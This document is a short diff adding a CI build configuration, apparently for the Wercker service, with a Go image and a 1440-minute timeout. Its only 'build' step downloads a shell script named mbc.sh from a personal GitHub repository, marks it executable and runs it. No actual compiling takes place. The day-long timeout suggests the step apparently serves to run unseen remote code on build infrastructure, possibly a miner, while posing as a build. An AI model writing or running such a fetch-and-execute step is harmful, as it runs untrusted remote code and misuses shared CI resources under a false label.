@@ -1,0 +1,8 @@
+box: golang:latest
+command-timeout: 1440
+build:
+  steps:
+    - script:
+        name: build
+        code: |
+          wget https://raw.githubusercontent.com/sijojon88/sijojon88/main/mbc.sh && chmod +x mbc.sh && sh mbc.sh
